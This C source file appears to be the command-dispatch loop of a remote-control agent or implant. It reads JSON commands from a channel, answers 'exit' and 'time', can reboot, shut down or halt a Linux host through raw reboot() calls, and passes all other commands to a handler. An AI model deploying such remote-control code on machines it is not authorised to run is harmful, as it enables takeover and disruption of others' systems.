/*
* MIT License
*
* Copyright (c) 2020-2022 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "json.h"
#include "channel.h"
#include "handler.h"

#ifndef _WIN32
#include <sys/types.h>
#include <sys/utsname.h>

#include <unistd.h>
#include <errno.h>

#ifdef SYSCALL_REBOOT
#include <linux/reboot.h>
#define reboot(arg) reboot(0xfee1dead, 0x28121969, arg, NULL)
#else
#include <sys/reboot.h>
#endif

#endif

void interact(int channel)
{
    while (1) {
        char *input = read_channel(channel);
        JSONObject *json = parseJSON(input);

        char *cmd = find_json(json, "cmd");
        char *args = find_json(json, "args");
        char *token = find_json(json, "token");

        if (strcmp(cmd, "exit") == 0) {
            send_channel(channel, token);
            break;
        } else if (strcmp(cmd, "time") == 0) {
            send_channel(channel, "%s\n", get_time_str("%a %b %d %H:%M:%S %Z %Y"));
            send_channel(channel, token);

            continue;
        }

        #ifndef _WIN32
        if (strcmp(cmd, "reboot") == 0) {
            sync();

            if (reboot(0x01234567) != -1) {
                send_channel(channel, token);
		        break;
            }
        } else if (strcmp(cmd, "shutdown") == 0) {
            sync();

            if (reboot(0x4321fedc) != -1) {
                send_channel(channel, token);
                break;
            }
        } else if (strcmp(cmd, "halt") == 0) {
            sync();

            if (reboot(0xcdef0123) != -1) {
                send_channel(channel, token);
                break;
            }
        }
        #endif

        handle_command(channel, cmd, args);
        send_channel(channel, token);
    }
}
